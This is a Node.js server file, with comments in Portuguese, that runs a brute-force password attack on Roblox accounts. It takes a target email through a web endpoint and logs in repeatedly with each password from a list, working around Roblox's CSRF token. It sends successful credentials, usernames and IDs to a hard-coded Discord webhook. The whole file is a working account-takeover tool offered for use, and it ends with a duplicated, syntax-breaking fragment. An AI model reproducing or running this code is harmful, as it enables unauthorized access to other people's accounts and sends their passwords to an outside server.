const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// URL do Webhook do Discord
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

// Função para enviar mensagem no Discord via Webhook
async function sendDiscordMessage(content) {
    try {
        await axios.post(WEBHOOK_URL, {
            content: content,
            username: "Roblox Brute Forcer",
            avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
        });
        console.log("✅ Mensagem enviada ao Discord!");
    } catch (e) {
        console.error("❌ Erro ao enviar msg no Discord:", e.message);
    }
}

// Função para tentar Login no Roblox (Método Corrigido)
async function tryRobloxLogin(email, password) {
    const client = axios.create({
        baseURL: 'https://auth.roblox.com',
        timeout: 15000,
        withCredentials: true,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json'
        }
    });

    try {
        // 1. Obter CSRF token
        const getReq = await client.get('/v2/login');
        const csrfToken = getReq.headers['x-csrf-token'];

        // 2. Enviar JSON de login
        const loginPayload = {
            username: email,
            password: password,
            isTfa: false
        };

        const loginRes = await client.post('/v2/login', loginPayload, {
            headers: {
                'X-CSRF-TOKEN': csrfToken,
                'Referer': 'https://www.roblox.com/login'
            }
        });

        if (loginRes.data && loginRes.data.user) {
            return { success: true, username: loginRes.data.user.name, userId: loginRes.data.user.id };
        } else if (loginRes.data.errors) {
            const err = loginRes.data.errors[0];
            if (err.code === 2) {
                return { success: false, error: "Credenciais inválidas" };
            } else if (err.code === 0 && err.message.includes("TwoStepVerification")) {
                return { success: false, error: "2FA necessário" };
            } else {
                return { success: false, error: err.message || "Erro desconhecido" };
            }
        } else {
            return { success: false, error: "Resposta inesperada do Roblox" };
        }

    } catch (error) {
        const status = error.response ? error.response.status : 'Sem Status';
        const data = error.response ? error.response.data : error.message;
        return {
            success: false,
            error: `HTTP ${status}: ${JSON.stringify(data).substring(0, 150)}`
        };
    }
}

// FUNÇÃO PRINCIPAL: Ataque de Força Bruta
async function startBruteForce(email) {
    let passwords = [];
    try {
        const rawData = fs.readFileSync(path.join(__dirname, 'senhas.txt'), 'utf-8');
        passwords = rawData.split('\n').map(p => p.trim()).filter(p => p.length > 0);
    } catch (e) {
        console.error("Erro ao ler senhas.txt:", e.message);
        await sendDiscordMessage(`**❌ ERRO:** senhas.txt não encontrado ou vazio!`);
        return;
    }

    if (passwords.length === 0) {
        await sendDiscordMessage(`**❌ ERRO:** A lista de senhas está vazia!`);
        return;
    }

    console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);

    let found = false;

    for (const password of passwords) {
        if (found) break;

        const result = await tryRobloxLogin(email, password);

        if (result.success) {
            found = true;
            const msg = `**✅ CONTA ENCONTRADA!**\n**Email:** ${email}\n**Senha Correta:** ${password}\n**Username:** ${result.username}\n**ID:** ${result.userId}`;
            await sendDiscordMessage(msg);
            console.log("ENCONTRADA:", password);
        } else {
            // Apenas envia erros relevantes (credenciais inválidas, 2FA, etc.)  
            // Para evitar flood, envia apenas a cada 10 tentativas falhas
            if (result.error.includes("2FA")) {
                await sendDiscordMessage(`**⚠️ 2FA DETECTADO**\n**Email:** ${email}\n**Senha:** ${password}\n**Erro:** ${result.error}`);
            } else if (result.error.includes("Credenciais inválidas")) {
                // Não enviar todas as falhas por flood, podemos logar apenas no console
                console.log(`Falha para ${password}: Credenciais inválidas`);
            } else {
                console.log(`Falha para ${password}: ${result.error}`);
                // Enviar apenas se for erro não-crítico (ex: rate limit)
                if (result.error.includes("HTTP 429") || result.error.includes("Too Many Requests")) {
                    await sendDiscordMessage(`**⏳ RATE LIMIT**\n**Senha:** ${password}\n**Erro:** ${result.error}`);
                }
            }
        }

        // Pausa de 2 segundos entre tentativas
        await new Promise(r => setTimeout(r, 2000));
    }

    if (!found) {
        await sendDiscordMessage(`**❌ ATAQUE FINALIZADO (Sem Sucesso)**\n**Alvo:** ${email}\n**Senhas Testadas:** ${passwords.length}`);
    }
}

// ENDPOINT: Receber o Email do Site e Iniciar o Ataque
app.post('/start-brute-force', async (req, res) => {
    const { email } = req.body;

    if (!email || !email.includes('@')) {
        return res.json({ success: false, error: "Email inválido" });
    }

    startBruteForce(email);

    return res.json({ success: true, message: "Ataque iniciado! Aguarde as notificações no Discord." });
});

// INICIAR SERVIDOR
app.listen(port, () => {
    console.log(`✅ Servidor rodando na porta ${port}`);
});

    console.log(`✅ Servidor rodando na porta ${port}`);
});
